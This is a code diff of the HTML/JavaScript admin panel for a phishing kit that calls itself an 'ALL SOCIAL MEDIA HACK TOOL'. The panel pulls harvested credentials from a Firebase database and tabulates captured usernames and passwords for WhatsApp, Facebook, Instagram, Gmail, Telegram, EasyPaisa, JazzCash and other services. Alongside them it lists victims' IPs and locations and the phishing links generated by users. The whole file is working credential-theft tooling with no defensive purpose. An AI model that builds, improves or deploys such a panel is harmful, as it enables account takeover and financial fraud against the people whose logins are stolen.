@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Admin Panel</title>
+    <title>⚙️ Admin Panel</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
     <script src="firebase-config.js"></script>
@@ -15,15 +15,15 @@
             color: #fff;
         }
         
-        /* Login */
-        .admin-login {
+        /* LOGIN SCREEN */
+        .login-screen {
             position: fixed;
             top: 0; left: 0; width: 100%; height: 100%;
             background: #0a0a0a;
             display: flex;
             justify-content: center;
             align-items: center;
-            z-index: 9999;
+            z-index: 99999;
         }
         .login-box {
             background: #111;
@@ -31,9 +31,14 @@
             border-radius: 15px;
             border: 1px solid #333;
             width: 90%;
-            max-width: 400px;
+            max-width: 380px;
         }
-        .login-box h2 { text-align: center; color: #ff6600; margin-bottom: 30px; }
+        .login-box h2 {
+            text-align: center;
+            color: #ff6600;
+            margin-bottom: 30px;
+            font-size: 1.5em;
+        }
         .login-box input {
             width: 100%;
             padding: 15px;
@@ -44,6 +49,10 @@
             color: #fff;
             font-size: 1em;
         }
+        .login-box input:focus {
+            border-color: #ff6600;
+            outline: none;
+        }
         .login-box button {
             width: 100%;
             padding: 15px;
@@ -52,185 +61,259 @@
             border-radius: 8px;
             color: #fff;
             font-size: 1.1em;
+            font-weight: bold;
             cursor: pointer;
             margin-top: 10px;
         }
-        .login-box .error { color: #ff0000; text-align: center; margin-top: 10px; display: none; }
+        .login-box button:hover { background: #ff5500; }
+        .login-box .error {
+            color: #ff3333;
+            text-align: center;
+            margin-top: 10px;
+            display: none;
+        }
+        .login-box .hint {
+            text-align: center;
+            color: #555;
+            font-size: 0.8em;
+            margin-top: 15px;
+        }
         
-        /* Dashboard */
+        /* DASHBOARD */
         .dashboard { display: none; }
-        .sidebar {
-            position: fixed;
-            left: 0; top: 0; width: 250px; height: 100%;
+        
+        .top-bar {
             background: #111;
-            border-right: 1px solid #222;
-            padding: 20px;
-            overflow-y: auto;
+            border-bottom: 1px solid #222;
+            padding: 15px 25px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 10px;
         }
-        .sidebar h2 { color: #ff6600; margin-bottom: 20px; font-size: 1.2em; }
-        .sidebar .stats {
-            background: #1a1a1a;
+        .top-bar h1 { color: #ff6600; font-size: 1.3em; }
+        .top-bar .info { color: #888; font-size: 0.85em; }
+        .top-bar .info strong { color: #0ff; }
+        
+        .quick-stats {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 12px;
+            padding: 20px 25px;
+            background: #0f0f0f;
+        }
+        .qstat {
+            background: #111;
+            border: 1px solid #222;
+            border-radius: 10px;
             padding: 15px;
-            border-radius: 10px;
-            margin-bottom: 15px;
+            text-align: center;
         }
-        .sidebar .stats div { margin: 5px 0; font-size: 0.9em; color: #ccc; }
-        .sidebar .stats span { color: #ff6600; font-weight: bold; }
+        .qstat .num { font-size: 2em; font-weight: 900; color: #ff6600; }
+        .qstat .lbl { color: #888; font-size: 0.8em; margin-top: 5px; }
         
-        .main-content {
-            margin-left: 250px;
-            padding: 20px;
-        }
+        .main-content { padding: 20px 25px; }
         
-        .header-bar {
+        .card {
             background: #111;
-            padding: 20px;
-            border-radius: 10px;
-            margin-bottom: 20px;
+            border: 1px solid #222;
+            border-radius: 12px;
+            margin-bottom: 25px;
+            overflow: hidden;
+        }
+        .card-header {
+            background: #1a1a1a;
+            padding: 15px 20px;
+            border-bottom: 1px solid #222;
+            font-weight: 600;
+            color: #ff6600;
             display: flex;
             justify-content: space-between;
             align-items: center;
         }
-        .header-bar h1 { font-size: 1.5em; }
-        .header-bar .ip-info { color: #888; font-size: 0.9em; }
-        
-        .data-section {
-            background: #111;
+        .card-header .badge {
+            background: #333;
+            padding: 3px 12px;
             border-radius: 10px;
-            padding: 20px;
-            margin-bottom: 20px;
-            border: 1px solid #222;
+            font-size: 0.8em;
+            color: #aaa;
         }
-        .data-section h3 { color: #ff6600; margin-bottom: 15px; }
         
+        .table-wrap { overflow-x: auto; padding: 0; }
         table {
             width: 100%;
             border-collapse: collapse;
+            font-size: 0.85em;
         }
-        table th, table td {
+        table th {
+            background: #1a1a1a;
             padding: 12px 15px;
             text-align: left;
-            border-bottom: 1px solid #222;
-            font-size: 0.9em;
+            color: #ff6600;
+            font-weight: 600;
+            white-space: nowrap;
+            border-bottom: 1px solid #333;
         }
-        table th { color: #ff6600; font-weight: 600; }
-        table tr:hover { background: rgba(255,255,255,0.03); }
-        table .password { color: #00ff00; font-family: monospace; }
-        table .ip { color: #00ccff; }
-        table .time { color: #888; }
-        table .service-badge {
+        table td {
+            padding: 10px 15px;
+            border-bottom: 1px solid #1a1a1a;
+            color: #ccc;
+        }
+        table tr:hover td { background: rgba(255,255,255,0.02); }
+        table .pass { color: #ff0; font-family: monospace; font-weight: 600; }
+        table .ip { color: #0ff; }
+        table .time { color: #666; font-size: 0.9em; }
+        
+        .service-tag {
             display: inline-block;
-            padding: 3px 10px;
-            border-radius: 12px;
-            font-size: 0.8em;
+            padding: 2px 10px;
+            border-radius: 10px;
+            font-size: 0.85em;
+            font-weight: 600;
         }
         
-        .badge-whatsapp { background: #25D366; color: #000; }
-        .badge-tiktok { background: #ff0050; color: #fff; }
-        .badge-facebook { background: #1877F2; color: #fff; }
-        .badge-instagram { background: #E4405F; color: #fff; }
-        .badge-snapchat { background: #FFFC00; color: #000; }
-        .badge-freefire { background: #FF6600; color: #fff; }
-        .badge-easypaisa { background: #00A859; color: #fff; }
-        .badge-jazzcash { background: #ED1C24; color: #fff; }
-        .badge-twitter { background: #1DA1F2; color: #fff; }
-        
-        .visitors-list {
-            max-height: 300px;
-            overflow-y: auto;
-        }
         .visitor-item {
             display: flex;
             justify-content: space-between;
-            padding: 10px;
-            border-bottom: 1px solid #222;
+            padding: 10px 15px;
+            border-bottom: 1px solid #1a1a1a;
             font-size: 0.85em;
+            flex-wrap: wrap;
+            gap: 5px;
         }
-        .visitor-item .vip { color: #00ccff; }
+        .visitor-item .vip { color: #0ff; }
         .visitor-item .vtime { color: #666; }
+        .visitor-item .vpage { color: #888; }
+        .visitor-item:last-child { border-bottom: none; }
         
-        .refresh-btn {
-            padding: 10px 20px;
+        .no-data-msg {
+            text-align: center;
+            padding: 40px;
+            color: #555;
+        }
+        
+        .refresh-all {
+            padding: 8px 20px;
             background: #ff6600;
             border: none;
             border-radius: 5px;
             color: #fff;
             cursor: pointer;
+            font-size: 0.9em;
         }
-        .refresh-btn:hover { background: #ff5500; }
+        .refresh-all:hover { background: #ff5500; }
+        
+        .developer-credit {
+            text-align: center;
+            padding: 20px;
+            color: #333;
+            font-size: 0.8em;
+            border-top: 1px solid #111;
+        }
         
         @media (max-width: 768px) {
-            .sidebar { display: none; }
-            .main-content { margin-left: 0; }
+            .top-bar { flex-direction: column; text-align: center; }
+            .quick-stats { grid-template-columns: 1fr 1fr; }
         }
     </style>
 </head>
 <body>
-    <div class="admin-login" id="adminLogin">
+    <!-- LOGIN SCREEN -->
+    <div class="login-screen" id="loginScreen">
         <div class="login-box">
-            <h2>🔒 Admin Panel</h2>
+            <h2>🔒 ADMIN PANEL</h2>
             <input type="password" id="adminPass" placeholder="Enter Admin Password">
-            <button onclick="adminLogin()">🔑 Login</button>
+            <button onclick="adminLogin()">🔑 LOGIN</button>
             <div class="error" id="loginError">❌ Invalid Password!</div>
+            <div class="hint">🔐 Contact Developer for password</div>
         </div>
     </div>
     
+    <!-- DASHBOARD -->
     <div class="dashboard" id="dashboard">
-        <div class="sidebar">
-            <h2>☠️ ADMIN PANEL</h2>
-            <div class="stats">
-                <div>👥 Total Visitors: <span id="totalVisitors">0</span></div>
-                <div>📊 Total Captures: <span id="totalCaptures">0</span></div>
-                <div>🔗 Links Generated: <span id="totalLinks">0</span></div>
-                <div>🌐 Unique IPs: <span id="uniqueIPs">0</span></div>
+        <div class="top-bar">
+            <div>
+                <h1>⚙️ ADMIN DASHBOARD</h1>
+                <div class="info">🌐 Your IP: <strong id="adminIP">Detecting...</strong> | 🔑 Session: Active</div>
             </div>
-            <div style="font-size:0.8em;color:#666;margin-top:20px;">
-                 Developer: Nawab Zada Hacker<br>
-                ☠️✌️🦅
+            <div>
+                <button class="refresh-all" onclick="loadAll()">🔄 Refresh All Data</button>
+            </div>
+        </div>
+        
+        <div class="quick-stats">
+            <div class="qstat">
+                <div class="num" id="totalCaptures">0</div>
+                <div class="lbl">🔓 Total Captures</div>
+            </div>
+            <div class="qstat">
+                <div class="num" id="totalLinks">0</div>
+                <div class="lbl">🔗 Generated Links</div>
+            </div>
+            <div class="qstat">
+                <div class="num" id="totalVisitors">0</div>
+                <div class="lbl">👥 Unique Visitors</div>
+            </div>
+            <div class="qstat">
+                <div class="num" id="totalVisits">0</div>
+                <div class="lbl">👁️ Total Visits</div>
+            </div>
+            <div class="qstat">
+                <div class="num" id="uniqueIPs">0</div>
+                <div class="lbl">🌐 Unique IPs</div>
+            </div>
+            <div class="qstat">
+                <div class="num" id="totalUsers">0</div>
+                <div class="lbl">👤 Link Generators</div>
             </div>
         </div>
         
         <div class="main-content">
-            <div class="header-bar">
-                <div>
-                    <h1>📊 Live Dashboard</h1>
-                    <div class="ip-info">🌐 Your IP: <span id="adminIP">Detecting...</span></div>
+            <!-- CAPTURED DATA -->
+            <div class="card">
+                <div class="card-header">
+                    🔓 Captured Credentials (Username + Password)
+                    <span class="badge" id="captureCountBadge">0</span>
                 </div>
-                <button class="refresh-btn" onclick="loadData()">🔄 Refresh</button>
-            </div>
-            
-            <div class="data-section">
-                <h3>🔓 Captured Credentials</h3>
-                <div style="overflow-x:auto;">
-                    <table id="capturesTable">
+                <div class="table-wrap">
+                    <table>
                         <thead>
                             <tr>
                                 <th>Service</th>
                                 <th>Username</th>
-                                <th>Password</th>
+                                <th>🔑 Password</th>
                                 <th>Target</th>
-                                <th>IP Address</th>
-                                <th>Location</th>
-                                <th>Time</th>
+                                <th>🌐 IP</th>
+                                <th>📍 Location</th>
+                                <th>🕐 Time</th>
                             </tr>
                         </thead>
                         <tbody id="capturesBody">
-                            <tr><td colspan="7" style="text-align:center;color:#666;">Loading data...</td></tr>
+                            <tr><td colspan="7" class="no-data-msg">Loading data...</td></tr>
                         </tbody>
                     </table>
                 </div>
             </div>
             
-            <div class="data-section">
-                <h3>🌍 All Visitor IPs</h3>
-                <div class="visitors-list" id="visitorsList">
-                    <div style="text-align:center;color:#666;">Loading visitors...</div>
+            <!-- ALL VISITORS -->
+            <div class="card">
+                <div class="card-header">
+                    🌍 All Visitors & IPs
+                    <span class="badge" id="visitorCountBadge">0</span>
+                </div>
+                <div id="visitorsContainer">
+                    <div class="no-data-msg">Loading visitors...</div>
                 </div>
             </div>
             
-            <div class="data-section">
-                <h3>🔗 Generated Links</h3>
-                <div style="overflow-x:auto;">
+            <!-- GENERATED LINKS -->
+            <div class="card">
+                <div class="card-header">
+                    🔗 All Generated Links
+                    <span class="badge" id="linkCountBadge">0</span>
+                </div>
+                <div class="table-wrap">
                     <table>
                         <thead>
                             <tr>
@@ -238,30 +321,38 @@
                                 <th>Target</th>
                                 <th>Generator IP</th>
                                 <th>Status</th>
-                                <th>Time</th>
+                                <th>🕐 Time</th>
                             </tr>
                         </thead>
                         <tbody id="linksBody">
-                            <tr><td colspan="5" style="text-align:center;color:#666;">Loading links...</td></tr>
+                            <tr><td colspan="5" class="no-data-msg">Loading links...</td></tr>
                         </tbody>
                     </table>
                 </div>
             </div>
         </div>
+        
+        <div class="developer-credit">
+            👨‍💻 Developer: Nawab Zada Hacker ☠️✌️🦅 | ALL SOCIAL MEDIA HACK TOOL
+        </div>
     </div>
     
     <script>
-        const ADMIN_PASSWORD = "nawabzada2026"; // 
+        // ========================
+        // ADMIN PASSWORD
+        // ========================
+        const ADMIN_PASSWORD = "nawab2026";
         
         function adminLogin() {
             const pass = document.getElementById('adminPass').value;
             if (pass === ADMIN_PASSWORD) {
-                document.getElementById('adminLogin').style.display = 'none';
+                document.getElementById('loginScreen').style.display = 'none';
                 document.getElementById('dashboard').style.display = 'block';
-                loadData();
-                setInterval(loadData, 10000);
+                loadAll();
+                setInterval(loadAll, 10000); // Auto refresh every 10s
             } else {
                 document.getElementById('loginError').style.display = 'block';
+                setTimeout(() => { document.getElementById('loginError').style.display = 'none'; }, 3000);
             }
         }
         
@@ -269,37 +360,67 @@
             if (e.key === 'Enter') adminLogin();
         });
         
+        // Detect admin IP
         fetch('https://api.ipify.org?format=json')
             .then(r => r.json())
-            .then(data => {
-                document.getElementById('adminIP').textContent = data.ip;
-            });
+            .then(d => { document.getElementById('adminIP').textContent = d.ip; })
+            .catch(() => { document.getElementById('adminIP').textContent = 'Unknown'; });
         
-        function loadData() {
-            db.ref('all_captures').once('value', snapshot => {
+        // ========================
+        // LOAD ALL DATA
+        // ========================
+        function loadAll() {
+            loadCaptures();
+            loadVisitors();
+            loadLinks();
+        }
+        
+        function loadCaptures() {
+            db.ref('captured_data').once('value', function(snapshot) {
                 const data = snapshot.val();
                 const tbody = document.getElementById('capturesBody');
-                const counts = document.getElementById('totalCaptures');
+                const badge = document.getElementById('captureCountBadge');
                 
                 if (!data) {
-                    tbody.innerHTML = '<tr><td colspan="7" style="text-align:center;color:#666;">No data captured yet</td></tr>';
-                    counts.textContent = '0';
+                    tbody.innerHTML = '<tr><td colspan="7" class="no-data-msg">❌ No data captured yet</td></tr>';
+                    badge.textContent = '0';
+                    document.getElementById('totalCaptures').textContent = '0';
                     return;
                 }
                 
                 let html = '';
                 let count = 0;
-                const entries = Object.values(data).reverse();
+                const entries = Object.entries(data);
                 
-                entries.forEach(item => {
+                // Sort by timestamp descending
+                entries.sort((a, b) => (b[1].timestamp || 0) - (a[1].timestamp || 0));
+                
+                entries.forEach(([linkId, item]) => {
+                    if (!item || !item.username) return;
                     count++;
-                    const serviceClass = 'badge-' + (item.service || 'unknown');
+                    const service = item.service || 'unknown';
                     const time = item.timestamp ? new Date(item.timestamp).toLocaleString() : 'Unknown';
+                    
+                    let serviceColor = '#888';
+                    if (service === 'whatsapp') serviceColor = '#25D366';
+                    else if (service === 'tiktok') serviceColor = '#000';
+                    else if (service === 'facebook') serviceColor = '#1877F2';
+                    else if (service === 'instagram') serviceColor = '#E4405F';
+                    else if (service === 'snapchat') serviceColor = '#FFFC00';
+                    else if (service === 'freefire') serviceColor = '#FF6600';
+                    else if (service === 'easypaisa') serviceColor = '#00A859';
+                    else if (service === 'jazzcash') serviceColor = '#ED1C24';
+                    else if (service === 'twitter') serviceColor = '#1DA1F2';
+                    else if (service === 'gmail') serviceColor = '#EA4335';
+                    else if (service === 'telegram') serviceColor = '#0088cc';
+                    
+                    const textColor = (service === 'snapchat') ? '#000' : '#fff';
+                    
                     html += `
                         <tr>
-                            <td><span class="service-badge ${serviceClass}">${item.service || 'Unknown'}</span></td>
-                            <td>${item.username || 'N/A'}</td>
-                            <td class="password">${item.password || 'N/A'}</td>
+                            <td><span class="service-tag" style="background:${serviceColor}; color:${textColor};">${item.serviceIcon || '📁'} ${service}</span></td>
+                            <td>${item.username}</td>
+                            <td class="pass">${item.password}</td>
                             <td>${item.target || 'N/A'}</td>
                             <td class="ip">${item.ip || 'Unknown'}</td>
                             <td>${item.location || 'Unknown'}</td>
@@ -308,104 +429,138 @@
                     `;
                 });
                 
-                tbody.innerHTML = html;
-                counts.textContent = count;
-            });
-            
-            db.ref('visitors').once('value', snapshot => {
-                const data = snapshot.val();
-                const list = document.getElementById('visitorsList');
-                const totalV = document.getElementById('totalVisitors');
-                const uniqueIPs = document.getElementById('uniqueIPs');
-                
-                if (!data) {
-                    list.innerHTML = '<div style="text-align:center;color:#666;">No visitors yet</div>';
-                    totalV.textContent = '0';
-                    uniqueIPs.textContent = '0';
-                    return;
+                if (count === 0) {
+                    tbody.innerHTML = '<tr><td colspan="7" class="no-data-msg">❌ No data captured yet</td></tr>';
+                } else {
+                    tbody.innerHTML = html;
                 }
                 
-                let html = '';
-                const ips = new Set();
-                const entries = Object.values(data).reverse();
-                
-                entries.forEach(item => {
-                    if (item.ip) ips.add(item.ip);
-                    const time = item.timestamp ? new Date(item.timestamp).toLocaleString() : 'Unknown';
-                    html += `
-                        <div class="visitor-item">
-                            <span class="vip">🌐 ${item.ip || 'Unknown'}</span>
-                            <span>${item.userAgent ? item.userAgent.substring(0, 40) + '...' : 'Unknown'}</span>
-                            <span class="vtime">${time}</span>
-                        </div>
-                    `;
-                });
-                
-                list.innerHTML = html;
-                totalV.textContent = entries.length;
-                uniqueIPs.textContent = ips.size;
+                badge.textContent = count;
+                document.getElementById('totalCaptures').textContent = count;
             });
             
-            db.ref('generated_links').once('value', snapshot => {
+            // Also count all_captures
+            db.ref('all_captures').once('value', function(snapshot) {
+                const data = snapshot.val();
+                if (data) {
+                    const count = Object.keys(data).length;
+                    document.getElementById('totalCaptures').textContent = count;
+                }
+            });
+        }
+        
+        function loadVisitors() {
+            const container = document.getElementById('visitorsContainer');
+            const badge = document.getElementById('visitorCountBadge');
+            
+            // Collect unique IPs from all sources
+            const allIPs = new Set();
+            const visitorList = [];
+            
+            // From /visitors
+            db.ref('visitors').once('value', function(snapshot) {
+                const data = snapshot.val();
+                if (data) {
+                    Object.values(data).forEach(item => {
+                        if (item.ip) allIPs.add(item.ip);
+                        visitorList.push({
+                            ip: item.ip || 'Unknown',
+                            ua: item.userAgent || '',
+                            time: item.timestamp || 0,
+                            source: 'Direct Visitor'
+                        });
+                    });
+                }
+                
+                // From /visits
+                db.ref('visits').once('value', function(snap2) {
+                    const visits = snap2.val();
+                    if (visits) {
+                        Object.entries(visits).forEach(([linkId, visitsData]) => {
+                            if (typeof visitsData === 'object') {
+                                Object.values(visitsData).forEach(v => {
+                                    if (v && v.ip) allIPs.add(v.ip);
+                                    visitorList.push({
+                                        ip: v?.ip || 'Unknown',
+                                        ua: v?.userAgent || '',
+                                        time: v?.timestamp || 0,
+                                        source: 'Link Visit: ' + (v?.page || 'unknown') + (v?.target ? ' [' + v.target + ']' : '')
+                                    });
+                                });
+                            }
+                        });
+                    }
+                    
+                    // Sort by time desc
+                    visitorList.sort((a, b) => b.time - a.time);
+                    
+                    let html = '';
+                    visitorList.forEach(v => {
+                        const time = v.time ? new Date(v.time).toLocaleString() : 'Unknown';
+                        html += `
+                            <div class="visitor-item">
+                                <span class="vip">🌐 ${v.ip}</span>
+                                <span class="vpage">${v.source}</span>
+                                <span class="vtime">${time}</span>
+                            </div>
+                        `;
+                    });
+                    
+                    if (!html) {
+                        html = '<div class="no-data-msg">👥 No visitors yet</div>';
+                    }
+                    
+                    container.innerHTML = html;
+                    badge.textContent = visitorList.length;
+                    document.getElementById('totalVisitors').textContent = visitorList.length;
+                    document.getElementById('uniqueIPs').textContent = allIPs.size;
+                });
+            });
+        }
+        
+        function loadLinks() {
+            db.ref('generated_links').once('value', function(snapshot) {
                 const data = snapshot.val();
                 const tbody = document.getElementById('linksBody');
-                const totalL = document.getElementById('totalLinks');
+                const badge = document.getElementById('linkCountBadge');
                 
                 if (!data) {
-                    tbody.innerHTML = '<tr><td colspan="5" style="text-align:center;color:#666;">No links generated</td></tr>';
-                    totalL.textContent = '0';
+                    tbody.innerHTML = '<tr><td colspan="5" class="no-data-msg">🔗 No links generated yet</td></tr>';
+                    badge.textContent = '0';
+                    document.getElementById('totalLinks').textContent = '0';
+                    document.getElementById('totalUsers').textContent = '0';
                     return;
                 }
                 
                 let html = '';
                 let count = 0;
-                const entries = Object.values(data).reverse();
+                const generators = new Set();
+                const entries = Object.entries(data);
                 
-                entries.forEach(item => {
+                entries.sort((a, b) => (b[1].timestamp || 0) - (a[1].timestamp || 0));
+                
+                entries.forEach(([linkId, item]) => {
                     count++;
+                    if (item.generatedBy) generators.add(item.generatedBy);
                     const time = item.timestamp ? new Date(item.timestamp).toLocaleString() : 'Unknown';
+                    const status = item.status || 'active';
+                    const statusColor = status === 'active' ? '#0f0' : '#ff0';
+                    
                     html += `
                         <tr>
-                            <td>${item.service || 'Unknown'}</td>
+                            <td>${item.serviceIcon || '📁'} ${item.serviceName || item.service || 'Unknown'}</td>
                             <td>${item.target || 'N/A'}</td>
                             <td class="ip">${item.generatorIP || 'Unknown'}</td>
-                            <td style="color:#0f0;">${item.status || 'active'}</td>
+                            <td style="color:${statusColor};">${status}</td>
                             <td class="time">${time}</td>
                         </tr>
                     `;
                 });
                 
                 tbody.innerHTML = html;
-                totalL.textContent = count;
-            });
-            
-            db.ref('visits').once('value', snapshot => {
-                const data = snapshot.val();
-                if (!data) return;
-                
-                const list = document.getElementById('visitorsList');
-                let extraHtml = '';
-                const allEntries = Object.entries(data);
-                
-                allEntries.forEach(([linkId, visits]) => {
-                    if (typeof visits === 'object' && visits !== null) {
-                        Object.values(visits).forEach(visit => {
-                            if (visit && visit.ip) {
-                                extraHtml += `
-                                    <div class="visitor-item">
-                                        <span class="vip">🌐 ${visit.ip || 'Unknown'}</span>
-                                        <span>${visit.page || 'Unknown'} - ${visit.target ? visit.target.substring(0,20) : 'Direct'}</span>
-                                        <span class="vtime">${visit.timestamp ? new Date(visit.timestamp).toLocaleString() : 'Unknown'}</span>
-                                    </div>
-                                `;
-                            }
-                        });
-                    }
-                });
-                
-                if (extraHtml) {
-                    list.innerHTML = extraHtml + list.innerHTML;
-                }
+                badge.textContent = count;
+                document.getElementById('totalLinks').textContent = count;
+                document.getElementById('totalUsers').textContent = generators.size;
             });
         }
     </script>
